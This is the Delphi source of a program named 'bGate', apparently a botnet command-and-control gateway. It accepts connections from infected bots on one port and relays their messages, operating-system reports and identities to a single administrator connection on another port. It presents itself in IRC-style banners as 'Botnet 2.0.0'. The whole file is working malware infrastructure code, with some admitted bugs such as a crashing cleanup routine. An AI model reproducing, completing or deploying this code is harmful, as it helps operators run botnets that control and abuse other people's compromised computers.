   program bGate;

   {$DEFINE DEBUG}
   {$IFDEF DEBUG}
     {$APPTYPE CONSOLE}
   {$ENDIF}

   uses
     Windows,
     Messages,
     Winsock;

   Type
     TSocketData = Record
       Socket: TSocket;
     End;
     PSocketData = ^TSocketData;

   Var
     SocketData            :TSocketData;
     wData                 :TWsaData;

     AdminSock             :TSocket;
     ServSock              :TSocket;
     ServSock2             :TSocket;

     BotSock               :Array[0..900000] Of TSocket;
     BotNick               :Array[0..900000] Of String;
     Params                :Array[0..500]    Of String;
     Params2               :Array[0..500]    Of String;
     Bots                  :Integer;

   Const
     MAX_BOT = 900000;

   Procedure FixBots;
   Var
     I, J: Integer;
     tmpSock: Array[0..MAX_BOT] Of TSocket;
     tmpNick: Array[0..MAX_BOT] Of String;
   Begin

     I := 0;
     J := 0;

     ZeroMemory(@I, SizeOf(I));
     ZeroMemory(@J, SizeOf(J));

     For I := 0 To MAX_BOT Do
     Begin
       tmpSock[i] := BotSock[i];
       tmpNick[i] := BotNick[i];
     End;

     ZeroMemory(@BotSock, SizeOf(BotSock));
     ZeroMemory(@BotNick, SizeOf(BotNick));

     J:=0;
     For I := 0 To MAX_BOT Do
     Begin
       If tmpSock[i] > 0  Then
       Begin
         BotSock[J] := tmpSock[i];
         BotNick[J] := tmpNick[i];
         Inc(J);
       End;
     End;

     Bots := J;

   End;

   procedure GetParams(S: String;Var Par: Array Of String);
   var
     Tmp         :String;
     I           :Integer;
   begin
     S := S + ' ';
     I := 0;
     FillChar(Par, 500, #0);

     While Pos(' ', S) > 0 Do
     Begin
       If I = 500 Then Break;
       Tmp := Copy(S, 1, Pos(' ', S)-1);
       S   := Copy(S, Pos(' ', S)+1, Length(S));
       If Tmp <> '' Then
       Begin

         if tmp[1] = '"' Then Delete(tmp, 1, 1);
         if tmp[1] = #10 then delete(tmp, 1, 1);
         if tmp[1] = #13 then delete(tmp, 1, 1);

         if tmp[length(tmp)] = '"' then delete(tmp, length(tmp), 1);
         if tmp[length(tmp)] = #10 then delete(tmp, length(tmp), 1);
         if tmp[length(tmp)] = #13 then delete(tmp, length(tmp), 1);

         Par[i] := Copy(Tmp, 1, 25);
         Inc(I);
       End;
     End;
     I := 2;
   end;

   function GetRemoteAddress(FSocket: TSocket): string;
   var
     SockAddrIn: TSockAddrIn;
     Size: Integer;
   begin
     Size := sizeof(SockAddrIn);
     getpeername(FSocket, SockAddrIn, Size);
     Result := inet_ntoa(SockAddrIn.sin_addr);
   end;

   Function SendData(Text:String; Sock: TSocket):Integer;
   Begin
     Result := Send(Sock, Text[1], Length(Text), 0);
   End;

   function IPtoHost(IP_Address : String): String;
   var
     Host: PHostEnt;
     Addr: Integer;
     dat: TWSAData;
   begin
     WSAStartup($0101, dat);
     try
       Addr := inet_addr(PChar(IP_Address));
       Host := gethostbyaddr(@Addr, 4, PF_INET);
       if Host <> nil then
          Result := Host.h_name
       else
          Result := '';
     finally
       WSACleanup;
     end;
   end;

   Function IntToStr(I:Integer):String;
   Begin
     Str(I, Result);
   End;

   function UpperCase(const S: string): string;
   var
     Ch: Char;
     L: Integer;
     Source, Dest: PChar;
   begin
     L := Length(S);
     SetLength(Result, L);
     Source := Pointer(S);
     Dest := Pointer(Result);
     while L <> 0 do
     begin
       Ch := Source^;
       if (Ch >= 'a') and (Ch <= 'z') then Dec(Ch, 32);
       Dest^ := Ch;
       Inc(Source);
       Inc(Dest);
       Dec(L);
     end;
   end;

   Function ReadSock(P :Pointer):Dword; StdCall;
   Var
     tmpHost:String;
     Socket: TSocket;
     recvBuf:Array[0..36000] Of Char;
     DAta  : String;
     Re    : Bool;
     Tmp   : String;
     I     : Integer;
     Tempy : String;
     Quit  : String;
   Begin
     Socket := PSocketData(P)^.Socket;

     Quit := GetRemoteAddress(Socket)+' '+IntToStr(Socket)+' QUIT'#10;

     While Recv(Socket, recvBuf, SizeOf(recvBuf), 0) > 0 Do
     Begin
       Re := False;
       Data := recvBuf;
       ZeroMemory(@recvBuf, SizeOf(recvBuf));
      {$IFDEF DEBUG}writeln('<: Server1 Income: '+Data);{$ENDIF}

       If Copy(Data, Pos(#10, Data)+1, 1) <> ''  Then
         Re := True Else Re := False;

       Repeat
         Tmp := Copy(Data, 1, Pos(#10, Data)-1);
         If Tmp[Length(Tmp)] = #13 Then Delete(Tmp, Length(Tmp), 1);
         Data := Copy(Data, Pos(#10, Data)+1, Length(Data));
         If Data = '' Then Re := False Else Re := True;

         GetParams(Tmp, Params);

         If UpperCase(Params[0]) = 'PRIVMSG' Then
         Begin
           For I := 0 To Bots -1 Do
           Begin
             If BotSock[I] = Socket Then
             Begin
               tempy := GetRemoteAddress(BotSock[i])+' '+IntToStr(BotSock[I])+' ';
               Tmp := tempy+Copy(BotNick[i],1,pos(#1,BotNick[i])-1)+'!'+Copy(BotNick[i],1,pos(#1,BotNick[i])-1)+'@'+
                      GetRemoteAddress(BotSock[I])+' '+Tmp+#10;
               SendData(Tmp, AdminSock);
             End;
           End;
         End;
         If Params[0] = 'CONNECTION' Then
         Begin
           For I := 0 To Bots -1 Do
           Begin
             If BotSock[I] = Socket Then
             Begin
               tempy := GetRemoteAddress(BotSock[i])+' '+IntToStr(BotSock[I])+' ';
               Tmp:= tempy + Tmp + #10;
               SendData(Tmp, AdminSock);
               Break;
             End;
           End;
         End;
         If Params[0] = 'OSTYPE' Then
         Begin
           For I := 0 To Bots -1 Do
           Begin
             If BotSock[I] = Socket Then
             Begin
               tempy := GetRemoteAddress(BotSock[i])+' '+IntToStr(BotSock[I])+' ';
               Tmp:= tempy + Tmp + #10;
               SendData(Tmp, AdminSock);
               Break;
             End;
           End;
         End;
         If Params[0] = 'USER' Then
         Begin
           For I := 0 To Bots -1 Do
           Begin
             If BotSock[I] = Socket Then
             Begin
               tempy := GetRemoteAddress(BotSock[i])+' '+IntToStr(BotSock[I])+' ';
               Tmp:= tempy+ Tmp + #10;
               SendData(Tmp, AdminSock);

               tmpHost := IPtoHost(GetRemoteAddress(Socket));

               If Params[4][1] = ':' Then Delete(Params[4],1,1);

               BotNick[I] := Params[4]+#1+GetRemoteAddress(Socket)+#1+
                             tmpHost;
               Break;
             End;
           End;
           SendData(':SiC NOTICE AUTH :*** Connecting to Botnet'+#10,Socket);
           SendData(':SiC NOTICE AUTH :*** Login Successfull'+#10,Socket);
           SendData(':SiC NOTICE AUTH :*** Welcome'+#10,Socket);
           SendData(':SiC NOTICE AUTH :*** MOTD'+#10,Socket);
           SendData(':SiC 001 '+Params[1]+' :Welcome '+Params[1]+'!'+Params[2]+'@'+tmpHost+'.'#10, Socket);
           SendData(':'+Params[1]+'!'+Params[2]+'@'+tmpHost+' JOIN :#Admin'#10, Socket);
           SendData(':SiC 353 '+Params[1]+' = #Admin :'+Params[1]+' '#10, Socket);
           SendData(':SiC!is@A.Admin TOPIC #Admin :(Botnet 2.0.0)'#10, Socket);
           SendData(':SiC 366 '+Params[1]+' #Admin :End of /NAME$ list'#10, Socket);
         End;

       Until Re = False;
     End;

     SendData(Quit, AdminSock);

     For I := 0 To Bots -1 Do
     Begin
       If BotSock[I] = Socket Then
       Begin
         BotNick[I] := '';
         BotSock[i] := 0;
       End;
     End;
     CloseSocket(Socket);
   End;

   Procedure Server1;
   Var
     Size: Integer;
     SockAddr: TSockAddr;
     SockAddrIn: TSockAddrIn;
     ThreadID: Dword;
     I, J: Integer;
   Begin
     ZeroMemory(@I, SizeOf(I));
     ZeroMemory(@J, SizeOf(J));

     ServSock := Socket(PF_INET, SOCK_STREAM, 0);
     SockAddrIn.sin_family := AF_INET;
     SockAddrIn.sin_port := hTons(6666);
     SockAddrIn.sin_addr.S_addr := INADDR_ANY;

     Bind(ServSock, SockAddrIn, SizeOf(SockAddrIn));

     Winsock.Listen(ServSock, 5);

     Repeat
       Size := SizeOf(TSockAddr);
       If AdminSock > 0 Then
       Begin

         For I := 0 To MAX_BOT Do
         Begin
           If BotSock[I] = 0 Then
           Begin
             J := I;
             If BotSock[J] = 0 Then
             Begin
               BotSock[J] := Winsock.Accept(ServSock, @SockAddr, @Size);
               SocketData.Socket := BotSock[J];
               CreateThread(NIL, 0, @ReadSock, @SocketData, 0, ThreadID);
               Inc(Bots);
               Break;
             End;
           End;
         End;
   //      FixBots; // <-- CRASHES; WHY IS THAT !?
       End;
     Until Bots = 900000;
   End;

   Procedure Server2;
   Var
     Size: Integer;
     SockAddr: TSockAddr;
     SockAddrIn: TSockAddrIn;
     ThreadID: Dword;
     I, J: Integer;
     Recvb: Array[0..1600] Of Char;
     Tmp: String;
     DAta  : String;
     Re    : Bool;
   Begin
     ServSock2 := Socket(PF_INET, SOCK_STREAM, 0);
     SockAddrIn.sin_family := AF_INET;
     SockAddrIn.sin_port := hTons(6668);
     SockAddrIn.sin_addr.S_addr := INADDR_ANY;

     Bind(ServSock2, SockAddrIn, SizeOf(SockAddrIn));

     Winsock.Listen(ServSock2, 5);

     Size := SizeOf(TSockAddr);
     AdminSock := Winsock.Accept(ServSock2, @SockAddr, @Size);

     ZeroMemory(@Recvb, SizeOf(Recvb));

     While Recv(AdminSock, Recvb, 1600, 0) > 0 Do
     Begin
       Re := False;
       Data := Recvb;
       ZeroMemory(@Recvb, SizeOf(Recvb));
       {$IFDEF DEBUG}writeln('<: Server2 Income: '+Data);{$ENDIF}

       If Copy(Data, Pos(#10, Data)+1, 1) <> ''  Then
         Re := True Else Re := False;

       Repeat
         Tmp := Copy(Data, 1, Pos(#10, Data)-1);
         If Tmp[Length(Tmp)] = #13 Then Delete(Tmp, Length(Tmp), 1);
         Data := Copy(Data, Pos(#10, Data)+1, Length(Data));
         If Data = '' Then Re := False Else Re := True;

         GetParams(Tmp, Params2);

         If Params2[0] = 'USER' Then
         Begin
           SendData('0 0 :SiC NOTICE AUTH :*** Connecting to Botnet'+#10,AdminSock);
           SendData('0 0 :SiC NOTICE AUTH :*** Login Successfull'+#10,AdminSock);
           SendData('0 0 :SiC NOTICE AUTH :*** Welcome'+#10,AdminSock);
           SendData('0 0 :SiC NOTICE AUTH :*** MOTD'+#10,AdminSock);
           SendData('0 0 :SiC 001 '+Params2[1]+' :Welcome '+Params2[1]+'!'+Params2[2]+'@Secret.com.'#10, AdminSock);
           SendData('0 0 :'+Params2[1]+'!'+Params2[2]+'@Secret.com JOIN :#Admin'#10, AdminSock);
           SendData('0 0 :SiC 353 '+Params2[1]+' = #Admin :'+Params2[1]+' '#10, AdminSock);
           SendData('0 0 :SiC!is@A.Admin TOPIC #Admin :(Botnet 2.0.0)'#10, AdminSock);
           SendData('0 0 :SiC 366 '+Params2[1]+' #Admin :End of /NAME$ list'#10, AdminSock);
         End;
       Until Re = False;
     End;

     CloseSocket(ServSock);
     CloseSocket(ServSock2);
     CloseSocket(AdminSock);
     For I := 0 To 900000 Do
     Begin
       If BotSock[i] > 0 Then
         CloseSocket(BotSock[i]);
     End;

   End;

   var
     ThreadID2: DWord;
   begin

     {$IFDEF DEBUG}writeln('<: Socket Startup');{$ENDIF}

     WSAStartUp(MAKEWORD(2,1), wData);

     AdminSock := 0;
     Bots := 0;
     ZeroMemory(@BotSock, SizeOf(BotSock));
     ZeroMemory(@BotNick, SizeOf(BotNick));

     Repeat
     {$IFDEF DEBUG}writeln('<: Starting Server1');{$ENDIF}
       CreateThread(NIL, 0, @Server1, NIL, 0, ThreadID2);
     {$IFDEF DEBUG}writeln('<: Starting Server2');{$ENDIF}
       Server2;
     Until 1 = 2;

     WSACleanUp;

   end.
